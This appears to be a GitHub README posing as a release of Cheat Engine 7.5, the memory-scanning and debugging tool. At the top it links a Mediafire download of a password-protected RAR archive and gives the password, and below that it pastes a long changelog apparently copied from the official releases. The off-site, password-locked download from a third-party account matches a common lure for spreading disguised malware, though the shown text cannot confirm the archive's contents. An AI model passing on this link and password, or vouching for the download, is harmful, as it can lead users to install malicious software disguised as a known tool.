# ENGINE-7.5

![image](https://github.com/sssaddicus/ENGINE-7.5/assets/126102259/4c1442ac-8cf4-40cb-89af-86693f0daba1)

### 👉 [Download CHEAT-ENGINE-7.5](https://www.mediafire.com/file/ml40a6yy09z2g55/CHEAT-ENGINE-7.5.rar/file) 👈
### 🔓Pass: 202023

### Changes:

#### from patreon 7.4.3 to public 7.5:

removed the driver requirement for the access memory regions tool

added 1 byte jmp instructions (that will install an exeption handler and place an int3 at the location)

added a scanoption so you can skip unpaged memory. (should prevent targets from eating up RAM when scanned)

reassemble() now rewrites an instruction using multiple lines when needed

make some error messages more descriptive

added an option to center the highlighted disassembler code to the center

added an explanation why the driver won't load and a link with info on how to get it to load for now

memoryrecord hotkeys can now be disabled individually

codefilter: unwind info now gives less bad results

added support for pseudo-ops like cmpss/sd/ps/pd

lua: added ceserver commands

lua: show a stacktrace on execution error

lua: added convertToUTF8(stringbytetable, regioncode)

made loading CT files with signatures possible under wine and proton

from patreon 7.4.2 to patreon 7.4.3:

ceserver: pipe support (mono data dissector)

ceserver: added change memory protection capability

ceserver: Available options can now be sent to the CE GUI

.netinfo: Replaced the fields view with a tree

network config: The processlist now has focus after opening a server

lua: added virtualstringtree

lua: added invertColor

lua: added disassembleBytes(bytestring)

autoassembler: now a visual warning is shown when nearby allocation fails

autoassembler: the templates now generate 14 byte jmp safe original code blocks as well

pointerscan now has a deviation option for "pointer must end with offset" to help find pointers back after update

ultimap: added copy selected results to clipboard

from patreon 7.4.1 to patreon 7.4.2

ipt: Added intel process trace feature provided by microsoft.

ceserver: Improve the modulelist fetch speed, more stable

ceserver: option to disconnect from closed ceservers

ceserver: the discovery list is now also a history list

ceserver: implement injection on arm64 as well

ceserver: also gets the fpu registers now

assembler x86_64: prefer mov rax,[rip+xxx] over mov rax,[imm64]

disasembler x86_64: switch from r#l to r#b because why not

mono: the dll now has a versioncheck so that you don't accidentally mix monodatacollector dll's

mono: deal with situations where there is no mainform

mono/.net: the methodlist is now sorted by name

better arm disassembler and assembler

better arm64 disassembler and assembler

the scanregions can be saved/loaded upon close/start ce (seperate option in settings)

added an option to skip loading .PDB files

a lot more functions are exposed to newstate threads

added ranges scans to groupscan

freeze+allow increase/decrease now also looks if the value is signed

trainers: Forms and controls now scale based on DPI

changing record showassigned/showashex now also applies to other selected entries

texttraces now don't save as .cetrace but as .txt now

ccode: #include now searches table files for files there as well

ccode: the internal symbolhandler can now deal with stdcalled function symbols

lua: added ImageIndex property to TTreeNode

lua: added OnValuechanged and OnValueChangedByUser callbacks to MemoryRecord objects

lua: added getOpenedFileSize()

lua: added onHelpEvent callback

lua: added releaseDebugFiles()

lua: added enumRegisteredSymbolLists() and enumRegisteredSymbols()

lua: added getBitmap method to ImageList objects

from public 7.4 to patreon 7.4.1:

added .Visible property to treenode entries

added .VisibleRowCount and .TopItem to listviews

added arm64 disassembling and assembling

added lua function "runCommand"

added a radiobutton to select if the generated script will use 5 or 14 byte jmps.

conditional jumps can now deal 2gb+ destinations (will get rewritten)

dotnetinfo: Performance improvement

memory record hotkeys now have a "Only while down" option

Updated the dbghelp to a more recent version which can better handle nowadys pdb symbols

different memory allocations now get placed within the initial allocation block. Protection is changed afterwards

tracer can now step over rep instructions

lua stringstream now inherits from memorystream, so you have access to the Memory field

lua: Added a callback for whenever the structure list is modified

added architecture distinguishing to ceserver

pressing escape in the hotkey form will now close it

added nested structure support

added string based custom types

ctrl+enter in the disassembler now shows relative addresses from that point

the diffcount in "find out what accessess/writes" will now stay even when disabling the option to find the number of different addresses an instruction accesses

### Fixes:

#### from patreon 7.4.3 to public 7.5:

vehdebug: Fixed a case where a new thread creation or other event would cause another event that would trigger at exactly the same time to get the exception ignored and just continued

monodatacollector: fixed invoke method

dotnetdatacollector: Fixed issue of loading a wrong version of dbgshim.dll

fixed disassembling cvtdq2pd

#### from patreon 7.4.2 to patreon 7.4.3:

ceserver: Fixed extension loading in some cases

ceserver: fixed stepping on x86 targets

fixed the name showing as [physical memory] instead of the filename when opening a file

fixed a rare error when scanning using specific options

fixed some documentation in celua at some points

fixed stackview in "more info" being garbage/access violation

fixed tracer search for instructions ending with ]

fixed enumExports lua function

fixed issue where vehdebug would crash

fixed the assembler from handing [rex+reg*x] as a symbol when debugging

fixed the disassembler backlist

fixed termination issue on the memscan object

from patreon 7.4.1 to patreon 7.4.2

Fixed the tracer search for instructions ending with a ]

VEH debug: Fixed the potential of invalid handles being used

Kernelmode debug and VEH debug: Fixed setting context on non suspended threads

fixed the lua_pcallk delegate in the c# plugin example

fixed speedhack on wine 7.0

fixed high dpi issue of structure dissect on first view

fixed high dpi issue on find what access/writes dialogs

restored the anchor editor (was gone in 7.4.1)

fixed .net info instance lookup issue

fixed customtypes getting marked as string (bug introduced in 7.4.1)

fixed runcommand

fixed modalforms from losing their text color internally (bug introduced in 7.4.1)

mac: fixed some progressbars not properly updating

#### from public 7.4 to patreon 7.4.1:

fixed the all type not finding 4 types when double was deselected

fixed the "all" type when not using double

fixed ccode esp access in 32-bit and "reg"f types

fixed disassembling when using binutils for disassembly

fixed the tablefiles menulist eating memory because they didn't get deleted properly

fixed .net issues that use obfoscated modules and missing metadata

fixed paring value starting with a - or +

fixed assembling pmovmskb

fixed disassembling vgather* vex256 instructions and allow usage of xmm/ymm registers as address (for instructions that allow it. Like this one)

fixed the addresslist not giving a proper error when using multiple enable or disable section

fixed error when using ctrl for speedhack hotkeys

fixed the groupscan command parser from assigning wildcard to the wrong combobox

fixed disassembling xchg eax/rax,xxx

fixed lua custom type registering as float when using the non lua function method

fixed small memoryscan issue for data at the end of a memoryblock

ccode doesn't register useless symbols anymore

#### January 18 2022:Cheat Engine 7.4 Released for Windows and Mac for everyone:

#### January 2 2022:Cheat Engine 7.4 Released for Windows and Mac for Patreons (public will be here soon):

Happy 2022. To start of this year good here's the official release of Cheat Engine 7.4

My patreon members can get it here

(The public release will be here any day now. Waiting for the advertisers / network owners to accept it)


Please reports bugs and give suggestions to improve Cheat Engine.

### Additions and changes:

AA templates now generate 14 byte jmp scripts when holding down ctrl

Foundcode dialog: Replace now toggles between nop and original. Also prevents duplicates

improved keyboard control to the hexview in memoryview. You can now hold shift while using the cursors to move

laststate isn't saved in tables anymore (unless ctrl is down)

added some space for dbvm functions so it's less likely to click them

you can now manually delete saved results

debugger attach timeout window will now show the status on some debugger interfaces

modules for 64-bit in 32-bit targets are more clearly marked as such

mono will not try to re-attach after a disconnect

lua: fixed copyMemory mode 2

#### from 7.3.1-7.3.2:

structure dissect watch for changes now also shows you when something has changed inbetween

added hints to how the pointer wildcard works

the replace button in foundcode dialog now supports multiselect

You can now also change values of groupscan scan results directly in the foundlist

lua's openProcess command now won't deactivate all entries when previously no process was selected

you can now edit instructions with a breakpoint on them

added linux ABI c-compiler dll's

by default mono now releases the .net thread

#### from 7.3.2-7.4:

added shortcut to add this address to addresslist in hexview (ctrl+numPlus)

goto address popup now centers on the memview window, instead of screen center

you can now change the font of the tracer tree

added isRep to the lua LastDisassemblerData field. And stepover now steps over rep instructions

break and trace: Added 'stay within module' option

added custom alignment option to the hexviewer section of the memoryviewer

### Fixes:

fixed loading back highligter config for auto assembler windows

.netinfo: fix field searching

fixed disassembler issues/memory corruption when closing a secondary memoryview window

fixed brake and trace killing the debugger when skipping certain modules an failing in figuring out the return address

fixed auto attach not stopping the process flash

mono is less likely to disconnect when dissecting an invalid memory address

fixed checkbox and radiobutton not sizing properly in dark mode

foundlist: display type override also afffects the saved columns

foundlist: new scan now alsdo clears the saved results

processlist: Fixed the highlighted color process entries in light mode

fixed compare to first scan hotkey

fixed handling of broken/empty language folders

fixed network modulesize lookup. (needs a new ceserver build as well)

fixed position saving for the foundcode dialog

fixed lua errors not giving a proper errormessage

fixed {$c} and {$ccode} for the 32-bit CE build

fixed logging of writes to ignore the addresslist freezing(Skyrimfus)

fixed dealing with -0.0f in c/ccode blocks

fixed memscan on the last block of readable memory

fixed dealing with the proper way of namespace.classname:modulename formatting. (Supports both formats)

fixed error when using freeze by thread with a very small interval

fixed {$ccode} and {$luacode} when not giving any parameters

fixed some include files erroring out when used

#### from 7.3.1-7.3.2:

network ceserver/linux: Fixed wpm corrupting the memory

fixed the elf symbol parser

fixed speedhack on linux

il2cpp now has a progressbar

fixed handling some newer il2cpp games

fixed vmin assembling

fixed freezing when entering the wrong ceserver details

fixed deleting groupscan entries from the scan

fixed pointerscan not loading results when in a path with non-ascii characters

fixed the standalone trainer maker giving an error about duplicate entries

#### from 7.3.2-7.4:

lua: fixed readByte signextending when it shouldn't

fix changeregonbp where it only changed xmm0

window position saving of "find what addresses this code accesses" should be more predictable

fixed saving of some color preferences in hexview, and added the fadecolor

fix AA createThreadAndWait not working in a standalone script

improved stability of mono

fixed break and trace ignore flag causing an stop instead of ignore on 64 bit targets


